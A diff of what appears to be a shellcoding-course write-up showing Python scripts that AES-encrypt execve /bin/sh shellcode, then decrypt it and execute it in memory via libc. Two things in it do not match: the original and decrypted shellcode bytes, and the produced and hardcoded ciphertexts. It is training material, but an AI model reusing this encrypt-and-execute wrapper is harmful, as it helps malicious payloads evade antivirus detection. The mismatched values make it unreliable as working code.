@@ -77,7 +77,7 @@ def aes128(shc):
  secret = 'KeepMeSecureEKEY' 
  cipher = AES.new(secret)
  encoded = EncodeAES(cipher, shc)
- print 'Encrypted shellcode using AES 128-bit key + Base64 encoded:\n\n', encoded
+ print 'Encrypted shellcode (AES 128-bit key + base-64 encoded):\n\n', encoded
 
 #execve-stack shellcode to spawn /bin/sh shell
 shellcode = b"\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x6c\\x73\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x89\\xe2\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80"
@@ -89,7 +89,7 @@ As a POC, the AES encryption wrapper script is executed resulting in the origina
 
 ```bash
 osboxes@osboxes:~/Downloads/SLAE$ python AES_encryption.py 
-Encrypted shellcode using AES 128-bit key + Base64 encoded:
+Encrypted shellcode (AES 128-bit key + base-64 encoded):
 
 5CJtU2PsI+erEYEb0l/3xle2srUXUxlJ8Zcv0RUKDAzn8dvPUM9H04Q8FCEK06HT7VlgveJoGWQDjXszmOjUkP0OvPf0OrefgZ/eRqrryx95REGDTPhOzCbPEY0el9s4zIV4N0lvsnFNy/o/aCRGOg==
 ```
@@ -125,7 +125,7 @@ cipher = AES.new(secret)
 #encrypted shellcode from AES_encryption.py
 encoded = '5CJtU2PsI+erEYEb0l/3xiQvT0P0eeArByo4NEbKDb3n8dvPUM9H04Q8FCEK06HT7VlgveJoGWQDjXszmOjUkP0OvPf0OrefgZ/eRqrryx95REGDTPhOzCbPEY0el9s4zIV4N0lvsnFNy/o/aCRGOg=='
 decoded = DecodeAES(cipher, encoded)
-print 'Decrypted shellcode (AES 128-bit key + Base64 decoded):\n\n', decoded
+print 'Decrypted shellcode (AES 128-bit key + base-64 decoded):\n\n', decoded
 
 #execute execve-stack shellcode to spawn /bin/sh shell
 libc = CDLL('libc.so.6')
@@ -145,7 +145,7 @@ The final POC, the encrypted shellcode hardcoded within the python wrapper scrip
 
 ```bash
 osboxes@osboxes:~/Downloads/SLAE$ python AES_decryption.py 
-Decrypted shellcode (AES 128-bit key + Base64 decoded):
+Decrypted shellcode (AES 128-bit key + base-64 decoded):
 
 \x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80
 
